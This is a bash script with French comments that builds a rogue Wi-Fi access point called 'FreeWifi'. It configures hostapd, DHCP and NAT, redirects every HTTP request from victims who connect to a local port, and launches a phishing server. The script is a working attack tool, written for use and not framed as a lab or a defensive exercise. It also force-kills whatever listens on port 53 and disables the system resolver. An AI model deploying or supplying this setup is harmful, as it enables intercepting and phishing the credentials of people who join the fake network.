#!/bin/bash

# Variables
IFACE_WLAN="wlx40a5ef21ae00"  # Interface Wi-Fi
IFACE_ETH="wlo1"    # Interface avec accès Internet
AP_SSID="FreeWifi"  # Nom du RogueAP
AP_PASS="password1234" # Clé WPA2

# 1. Configurer Hostapd
cat <<EOF > hostapd.conf
interface=$IFACE_WLAN
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=6
wpa=2
wpa_passphrase=$AP_PASS
auth_algs=1
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF


# 2. Configurer Dnsmasq (DHCP)
cat <<EOF > dnsmasq.conf
interface=$IFACE_WLAN
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8,8.8.4.4
EOF

# 2.1. Arrêter les processus utilisant le port 53 (ex: systemd-resolved)
echo "[+] Vérification et arrêt des processus sur le port 53..."
sudo fuser -k 53/tcp 53/udp 2>/dev/null  # Tue tous les processus utilisant le port 53
sudo systemctl stop systemd-resolved 2>/dev/null  # Désactive temporairement systemd-resolved
sudo systemctl disable systemd-resolved 2>/dev/null


# 3. Activer le mode AP sur l'interface Wi-Fi
ip link set $IFACE_WLAN up
ip addr add 192.168.1.1/24 dev $IFACE_WLAN

# 4. Démarrer les services
hostapd hostapd.conf -B
dnsmasq -C dnsmasq.conf


# 5. Activer le NAT pour l'accès Internet
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o $IFACE_ETH -j MASQUERADE
iptables -A FORWARD -i $IFACE_WLAN -o $IFACE_ETH -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $IFACE_ETH -o $IFACE_WLAN -j ACCEPT

# 6. Rediriger tout le trafic HTTP vers le serveur de phishing
iptables -t nat -A PREROUTING -i $IFACE_WLAN -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080

# 7. Lancer le serveur de phishing
python3 phishing_server.py &
echo "RogueAP en WPA2 avec phishing opérationnel !"

# Garder le script en cours
sleep infinity
